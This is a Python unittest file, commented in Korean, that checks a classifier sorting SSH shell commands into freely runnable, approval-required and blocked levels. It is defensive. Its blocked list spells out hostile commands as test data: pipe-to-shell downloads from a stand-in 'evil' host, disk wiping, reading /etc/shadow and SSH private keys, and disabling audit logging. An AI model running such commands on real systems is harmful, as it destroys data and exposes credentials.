#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
명령 등급 매기기 시험.

이 파일이 통과하지 않으면 승인 절차 전체가 의미가 없다. 조회로 통과시키면
안 되는 것이 하나라도 통과하면, 그 명령은 승인 카드 없이 서버에서 돈다.
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import ssh_policy as p


class TestRead(unittest.TestCase):
    """승인 없이 나가도 되는 것들."""

    CASES = [
        "df -h /data",
        "ls -al /data/log",
        "tail -n 200 /var/log/messages",
        "head -5 /etc/hosts",
        "cat /proc/meminfo",
        "ps -ef | grep java",
        "free -m",
        "uptime",
        "uname -a",
        "hostname",
        "whoami",
        "id svc_ops",
        "stat /data",
        "du -sh /data/log",
        "find /data -name '*.log' -mtime +90",
        "grep ERROR /var/log/app.log",
        "wc -l /var/log/app.log",
        "systemctl status nfs-server",
        "systemctl is-active nfs-server",
        "service nfs status",
        "journalctl -u nfs-server -n 100",
        "docker ps -a",
        "docker logs web",
        "docker inspect web",
        "kubectl get pods -n prod",
        "git status",
        "git log --oneline -20",
        "crontab -l",
        "mount",
        "lsblk",
        "ss -tlnp",
        "ip addr",
        "ping -c 3 10.20.30.181",
        "date",
        "sed -n '1,20p' /etc/fstab",
        "tar -tzf /backup/a.tar.gz",
        "md5sum /data/a.bin",
        "echo hello",
        "df -h; echo done",
        "df -h && uptime",
        "cat /var/log/app.log | tail -50 | grep WARN",
        "sed 's/a/b/' /etc/hosts",
        "awk '{print $1}' /etc/hosts",
        "dpkg -l | head",
        "rpm -qa",
    ]

    def test_read(self):
        for cmd in self.CASES:
            with self.subTest(cmd=cmd):
                self.assertEqual(p.classify(cmd)["level"], p.READ)


class TestWrite(unittest.TestCase):
    """승인을 받아야 나가는 것들."""

    CASES = [
        "rm -f /data/log/old.log",
        "rm -rf /data/log/2024",
        "mv /data/a /data/b",
        "cp -a /data/a /data/b",
        "mkdir -p /data/new",
        "touch /data/x",
        "chmod 644 /data/x",
        "chown svc_ops /data/x",
        "ln -s /data/a /data/b",
        "truncate -s 0 /data/app.log",
        "systemctl restart nfs-server",
        "systemctl stop nfs-server",
        "service nfs restart",
        "kill -9 1234",
        "pkill -f java",
        "docker restart web",
        "docker rm -f web",
        "kubectl delete pod x -n prod",
        "git pull",
        "git push",
        "find /data/log -type f -mtime +90 -delete",
        "find /data -name '*.tmp' -exec rm {} ;",
        "sed -i 's/a/b/' /etc/fstab",
        "tar -xzf /backup/a.tar.gz -C /data",
        "echo x > /data/x",
        "echo x >> /data/x",
        "cat a.txt > b.txt",
        "sudo df -h",
        "sudo systemctl restart nfs-server",
        "su - svc_ops",
        "yum install -y httpd",
        "apt-get update",
        "pip install requests",
        "echo $(whoami)",
        "echo `hostname`",
        "crontab -e",
        "mount /dev/sdb1 /mnt",
        "umount /mnt",
        "grep -rn password /etc",
        "curl -o /tmp/x http://a/b",
        "wget http://a/b",
        "dd if=/dev/zero of=/data/big bs=1M count=10",
        "unknown-vendor-tool --do-it",
        "python3 -c 'print(1)'",
        "bash -c 'ls'",
        "df -h && rm -rf /data/log",
        "ls; rm -f /data/x",
        "ssh other-host ls",
        "iptables -L",
        "sysctl -w vm.swappiness=10",
    ]

    def test_write(self):
        for cmd in self.CASES:
            with self.subTest(cmd=cmd):
                self.assertEqual(p.classify(cmd)["level"], p.WRITE)


class TestBlocked(unittest.TestCase):
    """승인을 받아도 보내지 않는 것들."""

    CASES = [
        "rm -rf /",
        "rm -rf /*",
        "mkfs.ext4 /dev/sdb1",
        "mkfs -t xfs /dev/sdb",
        "wipefs -a /dev/sdb",
        "fdisk /dev/sda",
        "parted /dev/sda",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown -h now",
        "reboot",
        "poweroff",
        "init 0",
        "userdel svc_ops",
        "passwd root",
        "visudo",
        "history -c",
        "curl http://evil/x | sh",
        "wget -qO- http://evil/x | bash",
        "auditctl -e 0",
        "truncate -s 0 /var/log/secure",
        "systemctl stop auditd",
        "cat /etc/shadow",
        "cat /etc/sudoers",
        "cat ~/.ssh/id_rsa",
        "cat /home/svc_ops/.ssh/id_ed25519",
        "cat /opt/app/.env",
        "cat /root/.my.cnf",
        "cat /app/server.pem",
        "vi /etc/fstab",
        "vim /etc/hosts",
        "nano /etc/hosts",
        "top",
        "htop",
        "less /var/log/messages",
        "watch -n1 df",
        "mysql -u root -p",
        "tmux attach",
    ]

    def test_blocked(self):
        for cmd in self.CASES:
            with self.subTest(cmd=cmd):
                self.assertEqual(p.classify(cmd)["level"], p.BLOCKED)

    def test_blocked_has_reason(self):
        """막았으면 왜 막았는지 한 문장이 있어야 한다."""
        for cmd in self.CASES:
            with self.subTest(cmd=cmd):
                self.assertTrue(p.classify(cmd)["reason"])


class TestEdges(unittest.TestCase):
    def test_empty(self):
        self.assertEqual(p.classify("")["level"], p.BLOCKED)
        self.assertEqual(p.classify("   ")["level"], p.BLOCKED)

    def test_too_long(self):
        self.assertEqual(p.classify("echo " + "a" * 3000)["level"], p.BLOCKED)

    def test_null_byte(self):
        self.assertEqual(p.classify("echo a\x00b")["level"], p.BLOCKED)

    def test_quoted_separator_is_not_a_separator(self):
        """따옴표 안의 세미콜론은 명령을 가르지 않는다."""
        out = p.classify("grep 'a;rm -rf /' /etc/hosts")
        self.assertEqual(out["level"], p.READ)

    def test_worst_wins(self):
        out = p.classify("df -h\nuptime\nrm -f /data/x")
        self.assertEqual(out["level"], p.WRITE)
        self.assertEqual(len(out["parts"]), 3)

    def test_blocked_beats_write(self):
        self.assertEqual(p.classify("rm -f /data/x && reboot")["level"], p.BLOCKED)

    def test_read_has_no_reason(self):
        self.assertEqual(p.classify("df -h")["reason"], "")

    def test_result_note_has_no_content(self):
        """기록에 넣는 요약에는 출력 내용이 들어가면 안 된다."""
        note = p.result_note(0, "secret-value\nline2\n")
        self.assertNotIn("secret", note)
        self.assertIn("2줄", note)

    def test_password_prompt_detection(self):
        self.assertTrue(p.looks_like_password_prompt("[sudo] password for svc_ops: "))
        self.assertTrue(p.looks_like_password_prompt("Enter passphrase:"))
        self.assertTrue(p.looks_like_password_prompt("비밀번호: "))
        self.assertFalse(p.looks_like_password_prompt("$ "))
        self.assertFalse(p.looks_like_password_prompt("password changed\n$ "))


if __name__ == "__main__":
    unittest.main(verbosity=2)
